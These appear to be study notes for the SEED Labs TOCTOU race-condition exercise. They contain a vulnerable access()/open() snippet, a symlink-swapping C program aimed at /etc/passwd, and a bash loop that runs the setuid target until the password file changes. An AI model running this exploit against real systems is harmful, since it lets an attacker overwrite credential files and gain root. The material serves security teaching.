## Race Condition

Time-Of-Check, Time-Of-Use(TOCTOU)

```c
if (!access("/tmp/X", W_OK)) {		// test real user
    f = open("/tmp/X", O_WRITE);	// effective user
    write_to_file(f);
}
else {
    fprintf(stderr, "Permission denied\n");
}
```



![](https://raw.githubusercontent.com/lc1838228782/pics/master/img/seed_race_condition.png)

## Exploit

Attack

```c
#include <unistd.h>

int main()
{
    while (1) {
        unlink("/tmp/XYZ");
        symlink("/home/seed/SEEDLabs/Race_Condition/myfile", "/tmp/XYZ");
        usleep(10000);
        
        unlink("/tmp/XYZ");
        symlink("/etc/passwd", "/tmp/XYZ");
        usleep(10000);
    }
    return 0;
}
```

shell script

```shell
#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new"]
do
	./vulp < passwd_input
	new=$($CHECK_FILE)
done
echo "STOP... The passwd file has beed changed\n"
```

